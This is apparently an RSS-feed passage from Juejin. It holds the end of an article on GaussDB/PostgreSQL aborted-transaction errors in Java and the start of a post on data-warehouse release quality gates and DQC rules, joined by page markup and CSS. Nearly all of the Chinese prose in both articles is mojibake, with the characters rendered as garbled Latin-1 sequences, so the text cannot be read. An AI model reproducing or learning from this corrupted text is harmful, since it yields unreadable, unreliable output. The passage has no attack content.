<h4 data-id="heading-11">4.2 å¦‚æœè¦ä¸å›æ»šï¼Œåˆ™è¦å°½é‡è§„é¿dbå‡ºç°ä¸­æ–­äº‹åŠ¡çš„å¼‚å¸¸</h4>
<p><strong>å¯¹è”æœºæ“ä½œï¼š</strong></p>
<ul>
<li>æ’å…¥æ—¶ä½¿ç”¨<code>UPSERT</code>è¯­æ³•æˆ–æ˜¾ç¤ºå‰æ£€æŸ¥</li>
<li>åœ¨dbæ“ä½œå‰ï¼Œå°†å¾…å…¥åº“çš„voåšåˆè§„æ£€æŸ¥ï¼Œå¦‚å­—æ®µé•¿åº¦ã€éç©ºçº¦æŸç­‰</li>
</ul>
<p><strong>å¯¹æ‰¹é‡æ“ä½œï¼š</strong></p>
<ul>
<li>åœ¨æ¡†æ¶å±‚è®¾è®¡æ‰¹é‡å›æ»šæœºåˆ¶ï¼Œå¦‚æ‰¹é‡å›æ»šåé€ç¬”ç‹¬ç«‹äº‹åŠ¡é‡è¯•æˆ–é€ç¬”ä¸šåŠ¡è®¾ç½®ä¿å­˜ç‚¹ï¼Œå‡ºç°å¼‚å¸¸çš„åˆ™ç™»è®°å¼‚å¸¸å¹¶è·³è¿‡ï¼Œåç»­ç»§ç»­ï¼Œç›´åˆ°è¯¥æ‰¹æ¬¡å¤„ç†å®Œè¿›å…¥ä¸‹ä¸€æ‰¹ã€‚</li>
</ul>
<blockquote>
<p>åªè¦ä¸è½åº“å¼•èµ·äº‹åŠ¡abortï¼Œä¸€åˆ‡éƒ½è¿˜åœ¨ä½ æŒæ§ï¼</p>
</blockquote>
<h3 data-id="heading-12">5. æ€»ç»“</h3>
<p>GaussDBä½œä¸ºå…¼å®¹PostgreSQLåè®®çš„åˆ†å¸ƒå¼æ•°æ®åº“ï¼Œç»§æ‰¿äº†PostgreSQLä¸¥æ ¼çš„äº‹åŠ¡çŠ¶æ€ç®¡ç†æœºåˆ¶ã€‚å½“äº‹åŠ¡ä¸­çš„æŸä¸ªæ“ä½œå¤±è´¥æ—¶ï¼Œæ•´ä¸ªäº‹åŠ¡è¿›å…¥"aborted"çŠ¶æ€ï¼Œåç»­æ‰€æœ‰SQLæ“ä½œéƒ½ä¼šè¢«å¿½ç•¥ï¼Œç›´åˆ°äº‹åŠ¡ç»“æŸã€‚è¿™ä¸€ç‰¹æ€§è™½ç„¶ä¿è¯äº†æ•°æ®ä¸€è‡´æ€§ï¼Œä½†ä¹Ÿç»™Javaå¼€å‘è€…å¸¦æ¥äº†æŒ‘æˆ˜ã€‚</p>
<p>æœ¬æ–‡æ·±å…¥åˆ†æäº†è¿™ä¸€é—®é¢˜çš„æœ¬è´¨ï¼Œå¯¹æ¯”äº†ä¸»æµæ•°æ®åº“åœ¨äº‹åŠ¡é”™è¯¯å¤„ç†æ–¹é¢çš„å·®å¼‚ï¼Œå¹¶æä¾›äº†å¤šç§Javaç¼–ç¨‹æ¨èå®è·µï¼šå…³é”®åœ¨äºç†è§£æ•°æ®åº“äº‹åŠ¡çŠ¶æ€ç®¡ç†çš„å·®å¼‚ï¼Œé¿å…åœ¨PostgreSQL/GaussDBç¯å¢ƒä¸­ä½¿ç”¨ä»…é€‚ç”¨äºå…¶ä»–æ•°æ®åº“çš„è¡Œä¸ºå‡è®¾ã€‚é€šè¿‡åˆç†çš„æ¶æ„è®¾è®¡å’Œäº‹åŠ¡ç®¡ç†ç­–ç•¥ï¼Œå¯ä»¥æœ‰æ•ˆé¿å…<code>current transaction is aborted</code>é”™è¯¯ï¼Œç¡®ä¿åº”ç”¨ç¨‹åºçš„ç¨³å®šæ€§å’Œå¯é æ€§ã€‚</p>
<p>å¯¹äºä½¿ç”¨GaussDBæˆ–PostgreSQLçš„ä¼ä¸šçº§åº”ç”¨ï¼Œå»ºè®®å¼€å‘å›¢é˜Ÿå……åˆ†äº†è§£è¿™ä¸€ç‰¹æ€§ï¼Œå¹¶åœ¨ç³»ç»Ÿè®¾è®¡é˜¶æ®µå°±è€ƒè™‘ç›¸åº”çš„é”™è¯¯å¤„ç†ç­–ç•¥ï¼Œä»¥é¿å…åœ¨ç”Ÿäº§ç¯å¢ƒä¸­é‡åˆ°æ„å¤–çš„äº‹åŠ¡é—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»â€œäººæ²»â€åˆ°â€œæœºæ²»â€ï¼šå¾—ç‰©ç¦»çº¿æ•°ä»“å‘å¸ƒæµæ°´çº¿è´¨é‡é—¨ç¦å®è·µ]]></title>    <link>https://juejin.cn/post/7600341731047555107</link>    <guid>https://juejin.cn/post/7600341731047555107</guid>    <pubDate>2026-01-29T06:52:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600341731047555107" data-draft-id="7600491179499159606" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»â€œäººæ²»â€åˆ°â€œæœºæ²»â€ï¼šå¾—ç‰©ç¦»çº¿æ•°ä»“å‘å¸ƒæµæ°´çº¿è´¨é‡é—¨ç¦å®è·µ"/> <meta itemprop="keywords" content="å¤§æ•°æ®"/> <meta itemprop="datePublished" content="2026-01-29T06:52:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾—ç‰©æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/2392954206960247"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»â€œäººæ²»â€åˆ°â€œæœºæ²»â€ï¼šå¾—ç‰©ç¦»çº¿æ•°ä»“å‘å¸ƒæµæ°´çº¿è´¨é‡é—¨ç¦å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392954206960247/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾—ç‰©æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T06:52:20.000Z" title="Thu Jan 29 2026 06:52:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å‰è¨€</h2>
<p>éšç€ä¼ä¸šæ•°å­—åŒ–è½¬å‹åŠ é€Ÿæ¨è¿›ï¼Œå¤§æ•°æ®ä¸šåŠ¡è§„æ¨¡å‘ˆç°æŒ‡æ•°çº§å¢é•¿ï¼Œè¿­ä»£å˜æ›´è¶Šå‘é¢‘ç¹ã€‚æ­¤èƒŒæ™¯ä¸‹ï¼Œå‘ˆç°"é«˜é¢‘å˜æ›´"ä¸"è¶…å¤§è§„æ¨¡"å¹¶å­˜çš„ç‰¹å¾ï¼Œè¿™ç§åŒé‡ç‰¹æ€§ç»™å¤§æ•°æ®ä»»åŠ¡çš„å‘å¸ƒå˜æ›´å¸¦æ¥äº†ä¸¥å³»æŒ‘æˆ˜ã€‚</p>
<h2 data-id="heading-1">äºŒã€é¡¹ç›®ç›®æ ‡</h2>
<p><strong>ç¦»çº¿æ•°ä»“ä»»åŠ¡èµ„äº§ç®¡ç†</strong></p>
<p>å¢é‡ï¼šé€šè¿‡å¤§æ•°æ®å˜æ›´å‘å¸ƒæµæ°´çº¿è¿›è¡Œå¡ç‚¹ï¼Œç¡®ä¿æœ«ç«¯ä»»åŠ¡å‘å¸ƒå‰ï¼Œæ¶ˆè´¹åœºæ™¯&amp;é£é™©ç­‰çº§å®Œæˆç»‘å®šã€‚å¢é‡ä»»åŠ¡å‘å¸ƒæ¶ˆè´¹åœºæ™¯ç»‘å®šç‡100%è¦†ç›–ã€‚</p>
<p>å­˜é‡ï¼šç›˜ç‚¹å­˜é‡èµ„äº§ä»»åŠ¡ï¼Œäººå·¥æ¢³ç†æ‰“æ ‡ï¼Œå®Œæˆåˆå§‹åŒ–æ¶ˆè´¹åœºæ™¯ç»‘å®šã€‚</p>
<p><strong>å¤§æ•°æ®å˜æ›´å‘å¸ƒæµæ°´çº¿</strong></p>
<p>æ•°ä»“ä»»åŠ¡å‘å¸ƒæµæ°´çº¿ç®¡æ§100%è¦†ç›–ï¼Œä»»åŠ¡å‘å¸ƒæ•ˆç‡æå‡60%ã€‚</p>
<h2 data-id="heading-2">ä¸‰ã€é¡¹ç›®æ–¹æ¡ˆ</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dcbbcbdf03ae4c869a91b4799f8179fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=QZE13mEVp5cv6Tsx6rr6em2WzPM%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h3 data-id="heading-3">æ•°ä»“ä»»åŠ¡èµ„äº§ç®¡ç†</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d6954c35f584787b99df00ed967578b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=0jv6VAoQYcAFbrplwcLprBM8Bww%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>æ¶ˆè´¹åœºæ™¯å®šä¹‰</strong></p>
<p>æ ¹æ®ä¸šåŠ¡ç”¨é€”æ¢³ç†æ¶ˆè´¹ç«¯å†…å®¹ï¼Œæ ¹æ®é£é™©é«˜ä½å®šä¹‰é£é™©ç­‰çº§P0ã€P1ã€P2ï¼Œä»æœ«èŠ‚ç‚¹è‡ªåŠ¨å€’æ¨è¿½æº¯ä¸Šæ¸¸å…¨é“¾è·¯ï¼Œå¹¶å…¨éƒ¨æ‰“ä¸Šé£é™©ç­‰çº§P0ã€P1ã€P2æ ‡è¯†ï¼Œä»¥ç›¸åŒçš„ç”Ÿäº§è§„èŒƒæ ‡å‡†è¦æ±‚ä¸Šä¸‹æ¸¸å„æ–¹ååŒä¿éšœã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba6a1b928c3c4763afc4868e6ea87c0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=c%2BYgadRA44Mj3ohKsnzatoBevSU%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>é£é™©ç­‰çº§å®šä¹‰</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5eb42fe993c14ff0a996420bd470633f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=FKQ%2B9CuEQsB9NkMs20RLfQY7mk4%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>æ¶ˆè´¹åœºæ™¯æ³¨å†Œ&amp;ç»‘å®š</strong></p>
<ul>
<li><strong>æ¶ˆè´¹åœºæ™¯æ³¨å†Œ</strong></li>
</ul>
<p>å½“å‰æ•°ä»“ä»»åŠ¡æ¶ˆè´¹åœºæ™¯å·²ç»å®Œæˆåˆæ­¥ç›˜ç‚¹å’Œæ¢³ç†ï¼Œå¹¶ä¸”å°†ç›˜ç‚¹çš„æ¶ˆè´¹åœºæ™¯æ•°æ®åˆå§‹åŒ–åˆ°å¹³å°ä¸­ã€‚éšç€è¿­ä»£åœºæ™¯çš„æ–°å¢ï¼Œéœ€è¦æ³¨å†Œæ–°çš„åœºæ™¯ï¼Œä»è€Œåº”ä¸šåŠ¡æ‰€éœ€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a44db55d88a747288596b986ae51adad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=Z6di80hvl2Zqe4JZzlXp2jaaApc%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li><strong>å­˜é‡èµ„äº§ä»»åŠ¡ç»‘å®š</strong></li>
</ul>
<p>é’ˆå¯¹å½“å‰æ•°ä»“å­˜é‡èµ„äº§ä»»åŠ¡è¿›è¡Œç›˜ç‚¹ï¼Œå°†admã€adså±‚è¡¨è¿›è¡Œæ¢³ç†ã€æ‰“æ ‡ï¼Œæœ€ç»ˆåˆå§‹åŒ–åˆ°å¹³å°ä¸­ï¼Œå®Œæˆå­˜é‡èµ„äº§ç»‘å®šæ¶ˆè´¹åœºæ™¯ã€‚</p>
<ul>
<li><strong>ä»»åŠ¡æ¶ˆè´¹åœºæ™¯åº”ç”¨</strong></li>
</ul>
<p>ä»»åŠ¡å’Œæ¶ˆè´¹åœºæ™¯å®Œæˆç»‘å®šåï¼Œä»è€Œå†³å®šä»»åŠ¡çš„åº”ç”¨åœºæ™¯ã€é£é™©ç­‰çº§ï¼ŒP0ã€P1ä»»åŠ¡å°†åœ¨å˜æ›´ç®¡æ§ã€çº¿ä¸Šç¨³å®šæ€§ä¿éšœç­‰å¾—åˆ°é‡ä¿ã€‚</p>
<h3 data-id="heading-4">æ•°ä»“å˜æ›´ç®¡æ§æµæ°´çº¿</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd3ec25b6c174764bbefe31ef8f678c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=d%2BQ3NXjO3p3RJAzM6SFQySKci5g%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>è´¨é‡å®šä¹‰(DQC)</strong></p>
<p>åœ¨ç¦»çº¿æ•°æ®ä»“åº“ï¼ˆæ•°ä»“ï¼‰ä¸­ï¼Œæ•°æ®è´¨é‡æ£€æŸ¥ï¼ˆDQCï¼ŒData Quality Checkï¼‰æ˜¯ç¡®ä¿æ•°æ®å‡†ç¡®æ€§ã€ä¸€è‡´æ€§ã€å®Œæ•´æ€§çš„é‡è¦ç¯èŠ‚ã€‚æ•°ä»“ETLä»»åŠ¡åœ¨åŠ å·¥å®Œæˆåï¼Œä¼šæ‰§è¡ŒDQCæ£€æŸ¥ï¼Œä»è€Œæœ‰æ•ˆã€åŠæ—¶å‘ç°æ•°æ®è´¨é‡é—®é¢˜ï¼Œä¾¿äºç ”å‘äººå‘˜åŠæ—¶ä¿®å¤ï¼Œé¿å…é—®é¢˜æ•°æ®å¯¹ä¸šåŠ¡é€ æˆæŸå¤±ã€‚</p>
<ul>
<li><strong>DQCå¼ºè§„åˆ™</strong></li>
</ul>
<p>å½“å¼ºè§„åˆ™æ‰§è¡Œä¸é€šè¿‡åï¼Œç›´æ¥å¤±è´¥ä»»åŠ¡ï¼ŒåŠæ—¶é€šçŸ¥ä»»åŠ¡Ownerï¼Œå¹¶æ‹¦æˆªä¸‹æ¸¸ä»»åŠ¡æ‰§è¡Œï¼Œå¾…ä¿®å¤åä¸‹æ¸¸é“¾è·¯å†ç»§ç»­æ‰§è¡Œã€‚ï¼ˆæ‹¦æˆªä»»åŠ¡ï¼Œéœ€è¦å€¼ç­äººå‘˜åŠæ—¶ä¿®å¤ã€‚ï¼‰</p>
<ul>
<li><strong>DQCå¼±è§„åˆ™</strong></li>
</ul>
<p>å½“å¼±è§„åˆ™æ‰§è¡Œä¸é€šè¿‡åï¼ŒåŠæ—¶é€šçŸ¥ä»»åŠ¡Ownerã€‚ä»»åŠ¡æ­£å¸¸æ‰§è¡ŒæˆåŠŸï¼Œä¸‹æ¸¸ä»»åŠ¡ä¹Ÿæ­£åœ¨è¿è¡Œã€‚ï¼ˆä¸æ‹¦æˆªä»»åŠ¡ï¼Œä¼šé€šçŸ¥åˆ°ä»»åŠ¡Ownerã€‚ï¼‰</p>
<p><strong>è´¨é‡å®šä¹‰é…ç½®</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/974a23fb07ba43d98f01b66c0cecb206~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=puuYyBdSDog231%2B8%2BeWtjjVbbIY%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li><strong>é€šç”¨å‹DQCè§„åˆ™</strong></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3512b3f1aab4648b9ba778cdfb4c63e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=1UkUpg7fLuZGXTSivlugXMYoAyM%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d98c1542c8154560927cf261bd0ff6e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=uLhY%2F6i5BBrqr4FmeAmcBgUuaNw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79a2fa1812f748bcbb90081b3a5a25ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=vWv8spTY%2F7flnSngyhgL3v8Ni0M%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>è´¨é‡å®šä¹‰é€šè¿‡å¯è§†åŒ–ç•Œé¢æ“ä½œï¼Œè®©ç”¨æˆ·å¯ä»¥ç›´æ¥é€šè¿‡ç®€å•çš„å‹¾é€‰æ–¹å¼ï¼Œå³å¯ç”Ÿæˆå¯¹åº”çš„DQCè§„åˆ™ï¼Œå¤§å¤§æé«˜ç ”å‘äººå‘˜é…ç½®DQCçš„æ•ˆç‡ã€‚</p>
<ul>
<li><strong>è‡ªå®šä¹‰DQCè§„åˆ™</strong></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d810c6bbd9e14324826a623e71239657~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=gLG73ppalBoRWLZ8umEQIg9d3BM%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>ç”¨æˆ·å¯ä»¥æŒ‰ç…§è§„åˆ™SQLè¡¥å……è§„åˆ™é€»è¾‘ï¼Œä»è€Œå®ç°è‡ªå®šä¹‰éªŒè¯SQLèå…¥DQC-SQLä¸­ï¼Œè¾¾åˆ°è‡ªå®šä¹‰DQCè§„åˆ™çš„æ•ˆæœã€‚</p>
<p><strong>å¼ºå¼±è§„åˆ™é…ç½®</strong></p>
